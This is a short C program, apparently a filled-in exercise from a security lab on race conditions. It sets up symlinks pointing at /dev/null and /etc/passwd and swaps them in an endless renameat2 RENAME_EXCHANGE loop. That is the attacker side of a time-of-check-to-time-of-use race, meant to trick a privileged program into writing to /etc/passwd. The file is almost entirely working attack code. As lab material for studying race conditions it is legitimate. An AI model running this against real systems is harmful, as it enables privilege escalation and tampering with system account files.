#define _GNU_SOURCE


#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>


int main()
{	

	unlink("/tmp/XYZ"); 
	symlink("/dev/null", "/tmp/XYZ");

	unlink("/tmp/ABC"); 
	symlink("/etc/passwd", "/tmp/ABC");

		// to be filled
		/* hint: you can use renameat2() with the "RENAME_EXCHANGE" flag to switch /tmp/XYZ and /tmp/ABC 
		so that what /tmp/XYZ points to can be switched between /dev/null and /etc/passwd */
	while (1){
		renameat2(AT_FDCWD, "/tmp/XYZ", AT_FDCWD, "/tmp/ABC", RENAME_EXCHANGE); 
	}

	return 0;
}
